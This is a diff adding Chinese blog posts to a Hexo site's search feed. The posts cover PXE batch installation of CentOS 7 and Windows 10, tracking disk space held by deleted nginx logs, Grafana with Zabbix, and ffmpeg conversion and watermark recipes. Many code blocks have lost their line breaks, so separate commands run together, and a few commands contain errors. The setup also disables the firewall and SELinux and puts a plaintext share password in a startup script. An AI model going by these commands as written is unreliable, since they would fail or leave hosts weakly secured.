_config.yml（如果有已存在的请删除）添加如下配置："></a>在 _config.yml（如果有已存在的请删除）添加如下配置：</h1><p>deploy:<br>  type: git<br>  repo: <a href="https://github.com/xx/xx" target="_blank" rel="noopener">https://github.com/xx/xx</a></p><h1 id="example-https-github-com-hexojs-hexojs-github-io"><a href="#example-https-github-com-hexojs-hexojs-github-io" class="headerlink" title="example, https://github.com/hexojs/hexojs.github.io"></a>example, <a href="https://github.com/hexojs/hexojs.github.io" target="_blank" rel="noopener">https://github.com/hexojs/hexojs.github.io</a></h1><p>  branch: gh-pages<br>完成這些操作你就可以執行hexo d上傳你的博客到github pages啦！！！</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> hexo </tag>
+            
+            <tag> docs </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pxe_server install linux and windows</title>
+      <link href="/2020/01/04/pxe_server/"/>
+      <url>/2020/01/04/pxe_server/</url>
+      
+        <content type="html"><![CDATA[<p></p><h1>PXE批量安装CentOS7操作系统</h1><br>批量部署前首先应该拥有一台部署完成的系统，也就是Server端。<br>PXE_Server部署DHCP、TFTP、Xinetd、Kickstart、(HTTP/FTP/NFS任选其一，本次部署采用FTP)，用来提供安装所需要的系统文件以及所要安装的软件。<br>关闭Firewalld/SElinux(为实验方便，减少麻烦，生产环境不推荐)<br><a id="more"></a><br>PXE批量部署原理：<p></p><ol><li>PXE Client 从自己的PXE网卡启动，向本网络中的DHCP服务器请求IP；</li><li>DHCP 服务器返回分配给客户机的IP 以及PXE文件的放置位置<br>(该文件一般是放在一台TFTP服务器上)；</li><li>PXE Client 向本网络中的TFTP服务器索取pxelinux.0 文件<br>(在 PXE Client 的 ROM 中，已经存在 TFTP Client)；</li><li>PXE Client 取得pxelinux.0 文件后之执行该文件；</li><li>根据pxelinux.0 的执行结果，通过TFTP服务器加载内核和文件系统 ；</li><li>进入安装画面, 此时可以通过选择HTTP、FTP、NFS 方式之一进行安装；</li></ol><p>1、DHCP服务器：为 PXE-client 分配 IP ，获得安装程序文件位置<br>2、TFTP服务器：传输安装文件、内核、菜单文件等给 PXE-client<br>3、Xinetd: TFTP服务超级守护进程, 用于唤醒TFTP服务;<br>4、Kickstart：生成的ks.cfg配置文件 本文没有介绍Kickstart 安装<br>5、HTTP/NFS/FTP 服务中的任意一种，用于传送安装源文件给 PXE-client<br>;:</p><p>安装DHCP服务</p><pre><code>yum install dhcp -y</code></pre><p>修改配置文件</p><pre><code>#vim /etc/dhcp/dhcpd.conf</code></pre><p>#———可用最简配置——————-</p><h1 id="网络和子网掩码-根据自己实际情况编写"><a href="#网络和子网掩码-根据自己实际情况编写" class="headerlink" title="网络和子网掩码(根据自己实际情况编写)"></a>网络和子网掩码(根据自己实际情况编写)</h1><pre><code>subnet 192.168.2.0 netmask 255.255.255.0 {   option routers 192.168.2.11;       range 192.168.2.3 192.168.2.25;   # 指定DHCP地址池  next-server 192.168.2.11; # 指定tftp服务器地址  filename &quot;pxelinux.0&quot;; #指定pxelinux.0文件}</code></pre><p>如果是在多网卡的情况下需要指定某块网卡启动DHCP服务，复制文件，修改配置文件，重新注册服务</p><pre><code>cp /usr/lib/systemd/system/dhcpd.service /etc/systemd/system/vi /etc/systemd/system/dhcpd.serviceExecStart=/usr/sbin/dhcpd -f -cf /etc/dhcp/dhcpd.conf -user dhcpd -group dhcpd --no-pid &lt;your_interface_name(s)&gt;(我要使用的网卡是ens192)systemctl --system daemon-reload</code></pre><p>启动服务</p><pre><code>systemctl start dhcpd.servicesystemctl enable dhcpd.service</code></pre><p>安装TFTP服务(无需认证，小文件传输)<br>安装xinetd、tftp-server和syslinux服务</p><p>#syslinux 会在 /usr/share/syslinux/pxelinux.0 生成pxelinux.0文件 ，需要手动复制到/var/lib/tftpboot/ 目录中，后面详细介绍。<br>syslinux文件解析</p><pre><code>        isolinux.bin       注：光盘镜像引导文件           isolinux.cfg       注：启动菜单的配置文件;自编辑           memdisk          注：引导IMG镜像的文件           vesamenu.c32(或menu.c32)  注：官方提供的二种窗口模块           chain.c32         注：指定分区启动  如：chain.c32 hd0,1 (或chain.c32 hd0,2)           reboot.c32       注：重新启动计算机的文件           m16-640x640-syslinux.jpg(或syslinux_splash.jpg)  注：自己可以定义新的图片作为背景，图图片格式 640*480  jpg/png）yum install xinetd -yyum install tftp-server syslinux -y</code></pre><p>配置xinetd，由xinetd管理tftp</p><pre><code>service tftp{        socket_type             = dgram        protocol                = udp        wait                    = yes        user                    = root        server                  = /usr/sbin/in.tftpd        server_args             = -s /var/lib/tftpboot                disable                 = no  #默认disable是yes的，把它改为no即可        per_source              = 11        cps                     = 100 2        flags                   = IPv4}</code></pre><p>启动服务</p><pre><code>systemctl enable tftpsystemctl enable xinetdsystemctl start tftpsystemctl start xinetd</code></pre><p>安装FTP服务</p><pre><code>yum install vsftp -y</code></pre><p>启动服务</p><pre><code>systemctl enable vsftpd.service &amp;&amp; systemctl start vsftpd.service</code></pre><p>复制内核文件<br>内核文件、虚拟根文件以及菜单文件，我们都是通过tftp服务来提供的，由于系统及版本的不同，对于一个比较复制机群来说，我们需要准备不同系统，不同版本的内核文件，initrd.img文件。菜单文件只需要一份即可。</p><p>挂载光驱</p><pre><code>mount /dev/cdrom /mnt  #挂载# cp /mnt/images/pxeboot/vmlinuz     /var/lib/tftpboot/     #vmlinuz文件，在镜像文件images/pxeboot/目录中，vmlinuz是可引导的、压缩的内核文件，vmlinuz是vmlinux的压缩文件。是可执行的Linux内核# cp /mnt/images/pxeboot/initrd.img  /var/lib/tftpboot/     #initrd.img文件，在镜像文件images/pxeboot/目录中，initrd是“initial ram disk”的简写。initrd用来临时的引导硬件到实际内核vmlinuz能够接管并继续引导的状态</code></pre><p>复制pxelinux.0文件到tftp目录下</p><pre><code># cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/</code></pre><p>复制一个菜单功能文件到/var/lib/tftpboot/</p><pre><code>#cp /usr/share/syslinux/vesamenu.c32 /var/lib/tftpboot/</code></pre><p>创建pxelinux.cfg/default 文件</p><pre><code>mkdir -p /var/lib/tftpboot/pxelinux.cfg/default</code></pre><p>编写default文件</p><pre><code>default vesamenu.c32menu tabmsg XiaoNan NIUBImenu title XiaoNan auto-install systemtimeout 300label install Centos7        kernel vmlinuz        append initrd=initrd.img inst.repo=ftp://192.168.2.11/centos7</code></pre><p>启动客户端进行安装<br><img src="/2020/01/04/pxe_server/1.jpg" alt=""><br><img src="/2020/01/04/pxe_server/4.jpg" alt=""><br>大功告成!</p><p>当然这还需要人工点击开始安装并配置才能安装，如想实现无人值守安装参照小白都能玩转的COBBLER无人值守安装<a href="https://blog.csdn.net/qq_37242520/article/details/100545758" target="_blank" rel="noopener">https://blog.csdn.net/qq_37242520/article/details/100545758</a><br>或者搜索kickstart实现无人值守安装！</p><p></p><h1>PXE批量安装windows操作系统</h1><br>在之前的环境下我们需要samba来共享windows安装文件<br>安装samba相关包<p></p><pre><code>#yum install samba samba-client cifs-utils -y</code></pre><p>创建共享的文件夹</p><pre><code>mkdir /smbshare/windows10useradd xiaonansmbpasswd -a xiaonanchown xiaonan:xiaonan /smbshare/</code></pre><p>修改samba配置文件,修改以下内容<br>vim /etc/samba/smb.conf</p><pre><code>[global]        workgroup = SAMBA        security = user        netbios name = pxe        passdb backend = tdbsam        printing = cups        printcap name = cups        load printers = yes        cups options = raw[install]         comment = Installation Media         path = /smbshare         public = yes         writable = no         printable = no         browseable = yes</code></pre><p>启动samba服务</p><pre><code>systemctl start smb nmb &amp;&amp; systemctl enable smb nmb</code></pre><p>复制WIN10镜像文件到samba共享目录</p><pre><code>cp -rf win10.iso /smbshare/windows10/</code></pre><p>创建windows10PE<br>我们需要windows ADK去制作自己的winpe,访问微软官方网站<a href="https://docs.microsoft.com/en-us/windows-hardware/get-started/adk-install下载并安装" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows-hardware/get-started/adk-install下载并安装</a><br>我这里下载的是下面两个软件，安装过程下一步就好。</p><pre><code>Download the Windows ADK for Windows 10, version 1903Download the Windows PE add-on for the ADK</code></pre><p>安装完成之后以管理员身份运行Deployment and Imaging Tools Environment</p><pre><code>copype amd64 c:\winpe</code></pre><p>挂载Boot.wim到临时目录</p><pre><code>Dism /Mount-Image /ImageFile:&quot;c:\winpe\media\sources\boot.wim&quot; /index:1 /MountDir:&quot;c:\winpe\mount&quot;</code></pre><p>修改启动脚本</p><pre><code>notepad c:\winpe\mount\Windows\System32\Startnet.cmd</code></pre><p>添加以下内容,注意字符之间的空格</p><pre><code>wpeinit net use z: \\pxe\install\windows10 /user:xiaonan xiaonanz:\setup.exe</code></pre><p>卸载并保存boot.vim</p><pre><code>Dism /Unmount-Image /MountDir:&quot;c:\winpe\mount&quot; /commit</code></pre><p>生成win10pe.iso</p><pre><code>MakeWinPEMedia /ISO c:\winpe c:\win10pe.iso</code></pre><p>把生成的win10pe.iso复制到/var/lib/tftpboot/winpe/下<br>添加win10选项到PXE启动菜单</p><p>#vim default</p><pre><code>label Install MS Windows 10menu label Install MS Windows 10        kernel memdisk        initrd /winpe/win10pe.isoappend iso raw</code></pre><p>大功告成！启动客户端!!!!<br><img src="/2020/01/04/pxe_server/1.jpg" alt=""><br><img src="/2020/01/04/pxe_server/3.jpg" alt=""><br><img src="/2020/01/04/pxe_server/2.jpg" alt=""><br>如果想让WINDOWS系统无人值守安装可以创建无人值守自动应答文件AutoUnattend.xml<br>详情可参考<a href="https://blog.csdn.net/zuoliang365/article/details/86592025" target="_blank" rel="noopener">https://blog.csdn.net/zuoliang365/article/details/86592025</a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>磁盘满了，原来是僵尸进程惹的祸、Grafana图形展示ZABBIX</title>
+      <link href="/2019/11/15/grafana/"/>
+      <url>/2019/11/15/grafana/</url>
+      
+        <content type="html"><![CDATA[<h2 id="linux-系统根目录满了，却找不到占用空间文件"><a href="#linux-系统根目录满了，却找不到占用空间文件" class="headerlink" title="linux 系统根目录满了，却找不到占用空间文件"></a>linux 系统根目录满了，却找不到占用空间文件</h2><p>今天以前同事突然找到我，说让我帮他看看他们公司Centos7服务器上的问题。<br><a id="more"></a><br>就把一张图丢过来了如下：<br><img src="/2019/11/15/grafana/" alt=""><br>问我系统磁盘怎么突然满了，找不到问题所在。<br>为了能快速定位问题，我要求远程过去。<br>因为已经确认了iNode没问题，首先敲下一行命令du -h –max-depth=1确认下各个文件的占比<br><img src="/2019/11/15/grafana/" alt=""><br>如图，各个文件的占比都正常<br>嗯，这给我的第一反应就是难道是中毒了？看了看进程也是挺正常的。<br>想到这，我就去看日志了。终于，被我找到了一些问题，原来他们服务器跑了NGINX服务，不过它里面的日志怎么是空的。说明日志是被删过的。查看历史记录，果然是被删掉了。在Linux或者Unix系统中，通过rm或者文件管理器删除文件将会从文件系统的目录结构上解除链接(unlink).然而如果文件是被打开的（有一个进程正在使用），那么进程将仍然可以读取该文件，磁盘空间也一直被占用。而他M们删除的是nginx的log文件删除的时候文件应该正在被使用<br>lsof |grep deleted 查看僵尸进程<br>kill 掉相应的进程即可！</p><hr> <h1>分布式监控Zabbix–使用Grafana进行图形展示</h1><p>今天介绍一款高颜值监控绘图工具Grafana，在使用Zabbix监控环境中，通常我们会结合Grafana进行图形展示。Grafana默认没有zabbix作为数据源，需要手动给zabbix安装一个插件，然后再添加进Grafana即可，非常简单。下面就介绍下Grafana的使用：</p><p>Grafana的官网：<a href="http://docs.grafana.org/installation/rpm/" target="_blank" rel="noopener">http://docs.grafana.org/installation/rpm/</a></p><p>1）Centos下的安装步骤<br>1 # wget <a href="https://s3-us-west-2.amazonaws.com/grafana-releases/release/grafana-4.3.1-1.x86_64.rpm" target="_blank" rel="noopener">https://s3-us-west-2.amazonaws.com/grafana-releases/release/grafana-4.3.1-1.x86_64.rpm</a><br>2 # yum install initscripts fontconfig<br>3 # rpm -Uvh grafana-4.3.1-1.x86_64.rpm<br>具体安装可参考官网文档<a href="https://grafana.com/docs/installation/rpm/" target="_blank" rel="noopener">https://grafana.com/docs/installation/rpm/</a><br>2）Installing on Debian / Ubuntu<br>查看官网文档<a href="https://grafana.com/docs/installation/debian/" target="_blank" rel="noopener">https://grafana.com/docs/installation/debian/</a></p><p>如果你们的服务器是内网的怎么办？<br>首先找你个能上外网又能和内网服务器通讯的服务器把软件包下载下来上传给内网的服务器，我这里使用的是同样的Centos系统执行以下命令实现<br>其他方式自己根据自己的情况而定。</p><pre><code>[root@max]#wget https://s3-us-west-2.amazonaws.com/grafana-releases/release/grafana-4.3.1-1.x86_64.rpm #下载包[root@max]#scp grafana-4.3.1-1.x86_64.rpm root@server:/tmp #上传包到内网服务器/tmp目录[root@server]#rpm -Uvh grafana-4.3.1-1.x86_64.rpm #安装包[root@server]#systemctl daemon-reload[root@server]#systemctl enable grafana-server.service[root@server]#systemctl start grafana-server.service</code></pre><p>Grafana配置文件<br>Systemd服务和daemon服务在后台运行时，都使用文件/etc/sysconfig/grafana-server来设置环境变量，可以通过修改garfana-server文件来设置日志目录等其他变量。</p><p>#默认日志文件：/var/log/grafana</p><p>#数据库设置</p><p>#缺省配置指定一sqlite3数据库位于/var/lib/grafana/grafana.db。请在升级前备份这个数据库。还可以使用MySQL或Postgres Grafana数据库。<br>访问测试ip:3000<br>缺省用户/密码 admin/admin</p><p>2）安装Grafana Zabbix插件安装<br><a href="https://grafana.com/plugins/alexanderzobnin-zabbix-app/installation" target="_blank" rel="noopener">https://grafana.com/plugins/alexanderzobnin-zabbix-app/installation</a><br>在线安装可使用使用grafana-cli工具安装。<br>离线安装下载包解压即可。</p><pre><code>[root@max]#wget https://grafana.com/api/plugins/alexanderzobnin-zabbix-app/versions/3.8.1/download #下载包[root@max]#scp alexanderzobnin-grafana-zabbix-v3.8.1-0-ga8b2e3c.zip  root@server:/tmp #上传包[root@server]#unzip alexanderzobnin-grafana-zabbix-v3.8.1-0-ga8b2e3c.zip -d /var/lib/grafana/plugins #解压包到grafana插件目录[root@server]#systemcli restart grafana-server #重启grafana服务</code></pre><p>3）访问grafana，<a href="http://IP:3000，默认用户名和密码：admin/admin" target="_blank" rel="noopener">http://IP:3000，默认用户名和密码：admin/admin</a><br><img src="/2019/11/15/grafana/Z0.png" alt=""><br>安装了grafana-zabbix插件后，需要启用这个插件，如下在grafana控制台里点击”zabbix”，选择”Plugin Config”-&gt;”Enable” （如没有zabbix选项，就点击”Plugins”-&gt;”Apps”-&gt;”Zabbix”-&gt;”Enable<br><img src="/2019/11/15/grafana/Z1.png" alt=""><br><img src="/2019/11/15/grafana/Z2.png" alt=""><br><img src="/2019/11/15/grafana/Z3.png" alt=""><br><img src="/2019/11/15/grafana/Z4.png" alt=""><br>我配置完成后的样式如下图<br><img src="/2019/11/15/grafana/Z6.png" alt=""></p><h2>具体的配置可参考博客<a href="https://www.cnblogs.com/kevingrace/p/7108060.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevingrace/p/7108060.html</a></h2>]]></content>
+      
+      
+      <categories>
+          
+          <category> linux </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+            <tag> zabbix </tag>
+            
+            <tag> grafana </tag>
+            
+            <tag> deleted </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ffmpeg and youtube</title>
+      <link href="/2019/09/15/ffmpeg/"/>
+      <url>/2019/09/15/ffmpeg/</url>
+      
+        <content type="html"><![CDATA[<h1>大概所有的因果都是从入坑开始的吧</h1><h1 id="今天心血来潮就到油管上面下些视频素材"><a href="#今天心血来潮就到油管上面下些视频素材" class="headerlink" title="今天心血来潮就到油管上面下些视频素材"></a>今天心血来潮就到油管上面下些视频素材</h1><p>在火狐浏览器附加组件中搜索<code>YouTube 视频一键下载器 / YouTube HD Download</code>进行添加后<br>科学上网<code>https://www.youtube.com/</code>（也就是传说中的油管）选择你喜欢的MV如下图分别下在所需清晰度下载VIDEO AND AUDIO<br><img src="/2019/09/15/ffmpeg/ffmpeg.png" alt=""><br>就是这样我踏上了入坑的道路。。。。。<br><a id="more"></a><br>  第一坑：<br>  因为是第一次使用这个插件下载视频，好不容易下载好了视频，点开播放。发现居然没有声音的。一脸懵逼中？？？？？<br>  回头看看插件，旁边还有个AUDIO按钮也有下载链接，开始我以为是根据你需求下载音频还是视频来的。现在明白了，一起下下来。<br>  第二坑：<br>  其中视频格式有webm ，mp4两种可供下载，音频有opus,aac两种格式可供下载，为什么会特别介绍这几个格式呢？<br>  因为我在使用opus和mp4合并时报了如下错误：</p><pre><code>max@Max:~/下载$ ffmpeg -i TT.opus -i TT.mp4 -c copy outTT.mp4</code></pre><p><code>....... [mp4 @ 0x564189666ce0] track 1: codec frame size is not set [mp4 @ 0x564189666ce0] opus in MP4 support is experimental, add &#39;-strict -2&#39; if you want to use it. Could not write header for output file #0 (incorrect codec parameters ?): Experimental feature</code><br>  大概意思就是opus不支持MP4编码吧。为了验证，我就把MP4格式转成WEBM格式再试一下。</p><pre><code>max@Max:~/下载$ ffmpeg -i TT.mp4 TT.webm   （MP4格式转成WEBM格式，这个过程有点久！）max@Max:~/下载$ ffmpeg -i TT.opus -i TT.webm -c copy outTT.webm</code></pre><p>  好小子，可以正常合并了，就是画质有点跌眼镜。只能默默的再去下载aac格式的音频再次合并。</p><pre><code>max@Max:~/下载$ ffmpeg -i TT.aac  -i TT.mp4 -c copy outTT.mp4</code></pre><p>  所有视频都完美合并，接下来就是愉快得欣赏了！</p><h1 id="都说一朝入坑深似海，这不，我对ffmpeg这个软件有了很大的兴趣！"><a href="#都说一朝入坑深似海，这不，我对ffmpeg这个软件有了很大的兴趣！" class="headerlink" title="都说一朝入坑深似海，这不，我对ffmpeg这个软件有了很大的兴趣！"></a>都说一朝入坑深似海，这不，我对ffmpeg这个软件有了很大的兴趣！</h1><p>FFmpeg是一套可以用来记录、转换数字音频、视频，并能将其转化为流的开源计算机程序。采用LGPL或GPL许可证。它提供了录制、转换以及流化音视频的完整解决方案。它包含了非常先进的音频/视频编解码库libavcodec，为了保证高可移植性和编解码质量，libavcodec里很多code都是从头开发的。</p><h1 id="功能：视频采集功能、视频格式转换、视频抓图、给视频加水印等"><a href="#功能：视频采集功能、视频格式转换、视频抓图、给视频加水印等" class="headerlink" title="功能：视频采集功能、视频格式转换、视频抓图、给视频加水印等"></a>功能：视频采集功能、视频格式转换、视频抓图、给视频加水印等</h1><h1 id="视频采集功能"><a href="#视频采集功能" class="headerlink" title="视频采集功能"></a>视频采集功能</h1><pre><code>ffmpeg视频采集功能非常强大，不仅可以采集视频采集卡或USB摄像头的图像，还可以进行屏幕录制，同时还支持以RTP方式将视频流传送给支持RTSP的流媒体服务器，支持直播应用。</code></pre><h1 id="ffmpeg在Linux下的视频采集"><a href="#ffmpeg在Linux下的视频采集" class="headerlink" title="ffmpeg在Linux下的视频采集"></a>ffmpeg在Linux下的视频采集</h1><p>ffmpeg对V4L2的视频设备提供了很好的支持，如：</p><pre><code>./ffmpeg -t 10 -f video4linux2 -s 176*144 -r 8 -i /dev/video0 -vcodec h263 -f rtp rtp://192.168.1.105:5060 &gt; /tmp/ffmpeg.sdp</code></pre><p><code>以上命令表示：采集10秒钟视频，对video4linux2视频设备进行采集，采集QCIF(176*144)的视频，没秒8帧，视频设备为/dev/video0,视频编码为H236,输出格式为RTP，后面定义了IP地址及端口，将该码流所对应的SDP文件重定向到/tmp/ffmpeg.sdp中，将此SDP文件上传到流媒体服务器就可以实现直播了。</code></p><h1 id="ffmpeg在windows下的视频采集"><a href="#ffmpeg在windows下的视频采集" class="headerlink" title="ffmpeg在windows下的视频采集"></a>ffmpeg在windows下的视频采集</h1><p>在windows下关于ffmpeg视频采集的资料非常少，但是ffmpeg还是支持windows下视频采集的。ffmpeg支持windows下video for windows(VFW)设备的视频采集，不过VFW设备已经过时，正在被WDM的视频设备所取代，但是ffmpeg还没有支持WDM的计划，不过好像有将WDM转为VFW的工具，因此ffmpeg还是可以在windows下进行视频采集的。</p><h1 id="视频格式转换功能"><a href="#视频格式转换功能" class="headerlink" title="视频格式转换功能"></a>视频格式转换功能</h1><pre><code>ffmpeg视频转换功能。视频格式转换，比如可以将多种视频格式转换为flv格式，可不是视频信号转换 。ffmpeg可以轻易地实现多种视频格式之间的相互转换(wma,rm,avi,mod等)，例如可以将摄录下的视频avi等转成视频网站所采用的flv格式。</code></pre><h1 id="视频截图功能"><a href="#视频截图功能" class="headerlink" title="视频截图功能"></a>视频截图功能</h1><pre><code>对于选定的视频，截取指定时间的缩略图。视频抓图，获取静态图和动态图，不提倡抓gif文件;因为抓出的gif文件大而播放不流畅。</code></pre><h1 id="给视频加水印功能"><a href="#给视频加水印功能" class="headerlink" title="给视频加水印功能"></a>给视频加水印功能</h1><p>使用ffmpeg 视频添加水印(logo)。每隔10秒交替出现logo</p><pre><code>ffmpeg -y -t 60 -i input.mp4 -i logo1.png -i logo2.png -filter_complex &quot;overlay=x=if(lt(mod(t\,20)\,10)\,10\,NAN ):y=10,overlay=x=if(gt(mod(t\,20)\,10)\,W-w-10\,NAN ) :y=10&quot; output.mp4</code></pre><p>跑馬燈（input1 放在底部的视频input2 ，放在上面的视频320x240， 输出视频的宽高）</p><pre><code>ffmpeg -i input1 -i input2 -vcodec libx264 -an -filter_complex &quot;overlay=x=&apos;if(gte(t,2), -w+(t-2)*20, NAN)&apos;:y=0&quot; -s 320x240 output.mp4</code></pre><p>2秒后logo从左到右移动（80 移动的距离，单位像素）</p><pre><code>ffmpeg -i input.mp4 -vf &quot;movie=logo.png[logo];[in][logo]overlay=x=&apos;if(gte(t\,2)\,((t-2)*80)-w\,NAN)&apos;&quot; output.mp4</code></pre><p>gif格式的logo循环命令</p><pre><code>ffmpeg -i video.mpg -ignore_loop 0 -i loop.gif -filter_complex  &quot;[0:v][1:v]overlay=10:10:shortest=1&quot; -vcodec mpeg2video out.mpg</code></pre><p>视频添加字幕</p><pre><code>ffmpeg  -i  input  -vf  drawtext=fontfile=arial.ttf:text=welcome output</code></pre><p>周期显示输入的文字水印</p><pre><code>ffmpeg -i input.mp4 -vf &quot;drawtext=fontfile=/usr/share/fonts/truetype/freefont/FreeSerif.ttf:text=&apos;testtest&apos;:x=w-100:y=100:enable=lt(mod(t\,3)\,1):fontsize=24:fontcolor=yellow@0.5:shadowy=2&quot; output.mp4</code></pre><h1 id="給視頻去除水印（需要計算水印位置座標，寬高，show-0水印位置没有边框，show-1水印位置是一个绿色框覆盖）"><a href="#給視頻去除水印（需要計算水印位置座標，寬高，show-0水印位置没有边框，show-1水印位置是一个绿色框覆盖）" class="headerlink" title="給視頻去除水印（需要計算水印位置座標，寬高，show=0水印位置没有边框，show=1水印位置是一个绿色框覆盖）"></a>給視頻去除水印（需要計算水印位置座標，寬高，show=0水印位置没有边框，show=1水印位置是一个绿色框覆盖）</h1><pre><code>ffmpeg -i fantastic-goal-celebrations-in-football-1.mp4 -filter_complex &quot;delogo=x=1000:y=150:w=250:h=100:show=0&quot; delogo.mp4</code></pre><h1 id="ffmpeg-命令集举例"><a href="#ffmpeg-命令集举例" class="headerlink" title="ffmpeg 命令集举例"></a>ffmpeg 命令集举例</h1><p>1.获取视频的信息</p><pre><code>ffmpeg -i video.avi</code></pre><p>2.将图片序列合成视频</p><pre><code>ffmpeg -f image2 -i image%d.jpg video.mpg</code></pre><p>上面的命令会把当前目录下的图片（名字如：image1.jpg. image2.jpg. 等…）合并成video.mpg<br>3.将视频分解成图片序列</p><pre><code>ffmpeg -i video.mpg image%d.jpg</code></pre><p>上面的命令会生成image1.jpg. image2.jpg. …<br>支持的图片格式有：PGM. PPM. PAM. PGMYUV. JPEG. GIF. PNG. TIFF. SGI<br>4.为视频重新编码以适合在iPod/iPhone上播放</p><pre><code>ffmpeg -i source_video.avi input -acodec aac -ab 128kb -vcodec mpeg4 -b 1200kb -mbd 2 -flags +4mv+trell -aic 2 -cmp 2 -subcmp 2 -s 320x180 -title X final_video.mp4</code></pre><p>说明：<br> 源视频：source_video.avi<br> 音频编码：aac<br> 音频位率：128kb/s<br> 视频编码：mpeg4<br> 视频位率：1200kb/s<br> 视频尺寸：320 X 180<br> 生成的视频：final_video.mp4<br>5.为视频重新编码以适合在PSP上播放</p><pre><code>ffmpeg -i source_video.avi -b 300 -s 320x240 -vcodec xvid -ab 32 -ar 24000 -acodec aac final_video.mp4</code></pre><p>说明：<br> 源视频：source_video.avi<br> 音频编码：aac<br> 音频位率：32kb/s<br> 视频编码：xvid<br> 视频位率：1200kb/s<br> 视频尺寸：320 X 180<br> 生成的视频：final_video.mp4<br>6.从视频抽出声音.并存为Mp3</p><pre><code>ffmpeg -i source_video.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 sound.mp3</code></pre><p>说明：<br> 源视频：source_video.avi<br> 音频位率：192kb/s<br> 输出格式：mp3<br> 生成的声音：sound.mp3<br>7.将wav文件转成Mp3</p><pre><code>ffmpeg -i son_origine.avi -vn -ar 44100 -ac 2 -ab 192 -f mp3 son_final.mp3</code></pre><p>8.将.avi视频转成.mpg</p><pre><code>ffmpeg -i video_origine.avi video_finale.mpg</code></pre><p>9.将.mpg转成.avi</p><pre><code>ffmpeg -i video_origine.mpg video_finale.avi</code></pre><p>10.将.avi转成gif动画（未压缩）</p><pre><code>ffmpeg -i video_origine.avi gif_anime.gif</code></pre><p>11.合成视频和音频</p><pre><code>ffmpeg -i son.wav -i video_origine.avi video_finale.mpg</code></pre><p>12.将.avi转成.flv</p><pre><code>ffmpeg -i video_origine.avi -ab 56 -ar 44100 -b 200 -r 15 -s 320x240 -f flv video_finale.flv</code></pre><p>13.将.avi转成dv</p><pre><code>ffmpeg -i video_origine.avi -s pal -r pal -aspect 4:3 -ar 48000 -ac 2 video_finale.dv</code></pre><p>或者：</p><pre><code>ffmpeg -i video_origine.avi -target pal-dv video_finale.dv</code></pre><p>14.将.avi压缩成divx</p><pre><code>ffmpeg -i video_origine.avi -s 320x240 -vcodec msmpeg4v2 video_finale.avi</code></pre><p>15.将Ogg Theora压缩成Mpeg dvd</p><pre><code>ffmpeg -i film_sortie_cinelerra.ogm -s 720x576 -vcodec mpeg2video -acodec mp3 film_terminate.mpg</code></pre><p>16.将.avi压缩成SVCD mpeg2<br>NTSC格式：</p><pre><code>ffmpeg -i video_origine.avi -target ntsc-svcd video_finale.mpg</code></pre><p>PAL格式：</p><pre><code>ffmpeg -i video_origine.avi -target pal-svcd video_finale.mpg</code></pre><p>17.将.avi压缩成VCD mpeg2<br>NTSC格式：</p><pre><code>ffmpeg -i video_origine.avi -target ntsc-vcd video_finale.mpg</code></pre><p>PAL格式：</p><pre><code>ffmpeg -i video_origine.avi -target pal-vcd video_finale.mpg</code></pre><p>18.多通道编码</p><pre><code>ffmpeg -i fichierentree -pass 2 -passlogfile ffmpeg2pass fichiersortie-2</code></pre><p>19.从flv提取mp3</p><pre><code>ffmpeg -i source.flv -ab 128k dest.mp3</code></pre><p>20.剪切音频:</p><pre><code>ffmpeg -ss 0:0:30 -t 0:0:5 -i input.mp3 -c copy out.mp3</code></pre><p>其中-ss 后接起始时间  -t后接剪切多长时间</p><h1 id="支持的编码"><a href="#支持的编码" class="headerlink" title="支持的编码"></a>支持的编码</h1><p>源自FFmpeg项目组的两个视频编码：<code>Snow、FFV1</code><br>支持的格式：<br><code>ASF、AVI、BFI[7]、IFF[8]、RL2[9]、FLV、MXF, Material eXchange Format, SMPTE 377MMatroska、Maxis XA[10]、MSN Webcam stream[11]、MPEG transport stream、TXD[6]、OMA[12]GXF, General eXchange Format, SMPTE 360Mmov,mp4,m4a,3gp,</code></p><p>现在一些视频网站的视频一般都是分段的，比如腾讯，爱奇艺等这些，那我们怎么把这些分段的合并起来并无损呢？</p><h1 id="ffmpeg无损合并视频的几种方法"><a href="#ffmpeg无损合并视频的几种方法" class="headerlink" title="ffmpeg无损合并视频的几种方法"></a>ffmpeg无损合并视频的几种方法</h1><h1 id="方法一：ffmpeg-concat协议"><a href="#方法一：ffmpeg-concat协议" class="headerlink" title="方法一：ffmpeg concat协议"></a>方法一：ffmpeg concat协议</h1><p>对于 MPEG 格式的视频，可以直接连接：</p><pre><code>ffmpeg -i &quot;concat:input1.mpg|input2.mpg|input3.mpg&quot; -c copy output.mpg</code></pre><p>对于非 MPEG 格式容器，但是是 MPEG 编码器（H.264、DivX、XviD、MPEG4、MPEG2、AAC、MP2、MP3 等），可以包装进 TS 格式的容器再合并。在新浪视频，有很多视频使用 H.264 编码器，可以采用这个方法</p><pre><code>ffmpeg -i input1.flv -c copy -bsf:v h264_mp4toannexb -f mpegts input1.tsffmpeg -i input2.flv -c copy -bsf:v h264_mp4toannexb -f mpegts input2.tsffmpeg -i input3.flv -c copy -bsf:v h264_mp4toannexb -f mpegts input3.tsffmpeg -i &quot;concat:input1.ts|input2.ts|input3.ts&quot; -c copy -bsf:a aac_adtstoasc -movflags +faststart output.mp4</code></pre><p>保存 QuickTime/MP4 格式容器的时候，建议加上 -movflags +faststart。这样分享文件给别人的时候可以边下边看。</p><h1 id="方法二：FFmpeg-concat-分离器"><a href="#方法二：FFmpeg-concat-分离器" class="headerlink" title="方法二：FFmpeg concat 分离器"></a>方法二：FFmpeg concat 分离器</h1><p>这种方法成功率很高，也是最好的，但是需要 FFmpeg 1.1 以上版本。先创建一个文本文件filelist.txt：</p><pre><code>file &apos;input1.mkv&apos;file &apos;input2.mkv&apos;file &apos;input3.mkv&apos;</code></pre><p>然后：</p><pre><code>ffmpeg -f concat -i filelist.txt -c copy output.mkv</code></pre><p>注意：使用 FFmpeg concat 分离器时，如果文件名有奇怪的字符，要在 